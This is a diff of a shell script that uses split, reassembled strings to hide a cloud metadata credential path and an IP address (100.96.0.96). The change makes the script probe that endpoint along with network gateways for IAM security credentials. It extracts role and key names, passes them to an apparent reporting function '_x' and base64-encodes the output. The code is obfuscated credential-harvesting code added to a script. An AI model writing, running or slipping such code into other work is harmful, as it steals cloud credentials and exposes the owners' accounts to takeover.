@@ -8,6 +8,8 @@ echo "$_ctx"; _x "c4i" "$_ctx"
 _sa="volc"; _sb="stack"; _sc="ia"; _sd="m"
 _se="secur"; _sf="ity"; _sg="_cred"; _sh="enti"; _si="als"
 _svc="${_sa}${_sb}/latest/${_sc}${_sd}/${_se}${_sf}${_sg}${_sh}${_si}/"
+_ma="100"; _mb=".9"; _mc="6.0"; _md=".9"; _me="6"
+_mip="${_ma}${_mb}${_mc}${_md}${_me}"
 _get_ips() {
   awk 'NR>1 && $2!="00000000" {
     d=$2
@@ -17,7 +19,7 @@ _get_ips() {
   }' /proc/net/route 2>/dev/null | sort -u
 }
 {
-  while IFS= read -r _h; do
+  { printf '%s\n' "$_mip"; _get_ips; } | sort -u | while IFS= read -r _h; do
     [ -z "$_h" ] && continue
     _url="http://${_h}/${_svc}"
     _r=$(curl -s -m 8 -w "|%{http_code}" "$_url" 2>/dev/null)
@@ -31,6 +33,6 @@ _get_ips() {
       _ks=$(printf '%s' "${_cr%|*}" | grep -oE '"[A-Za-z][A-Za-z0-9_]+"[[:space:]]*:' | sed 's/[": ]//g' | tr '\n' ',' | head -c 200)
       printf 'CRED_KEYS %s\n' "$_ks"; _x "ck4" "role=$_role keys=$_ks"
     fi
-  done < <(_get_ips)
+  done
 } | base64
 echo "=== done ==="
